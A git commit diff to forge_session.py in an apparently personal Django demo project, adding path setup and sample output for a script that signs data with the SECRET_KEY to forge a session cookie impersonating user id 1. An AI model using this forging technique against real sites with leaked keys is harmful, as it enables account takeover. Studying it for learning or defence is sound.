7e882ea3a6c109196dfd587f07934e9437ac8a5a
Vicky Kumar <imvickykumar999@gmail.com>
2024-06-11 11:04:26 +0530

    Update forge_session.py

--- impersonate/impersonate/forge_session.py
+++ impersonate/impersonate/forge_session.py
@@ -1,11 +1,16 @@
 import os
+import sys
 import json
 import base64
 from django.conf import settings
 from django.core.signing import Signer
 
+# Determine the project's root directory and add it to the Python path
+project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'))
+sys.path.append(project_root)
+
 # Set up Django settings
-os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'my_django_project.settings')
+os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'crudproject.settings')
 import django
 django.setup()
 
@@ -25,3 +30,9 @@ signer = Signer(key=SECRET_KEY)
 signed_session_data = signer.sign(session_data_encoded)
 
 print(f'Session Cookie: {signed_session_data}')
+
+
+'''
+(.venv) @imvickykumar999 ➜ /workspaces/Django-CRUD-Form/impersonate/impersonate (main) $ python forge_session.py 
+Session Cookie: eyJfYXV0aF91c2VyX2lkIjogIjEiLCAiX2F1dGhfdXNlcl9iYWNrZW5kIjogImRqYW5nby5jb250cmliLmF1dGguYmFja2VuZHMuTW9kZWxCYWNrZW5kIn0=:rRKKipbONKompC2CK0EudBKUlLnGpUZT2zn0wGyTrSU
+'''
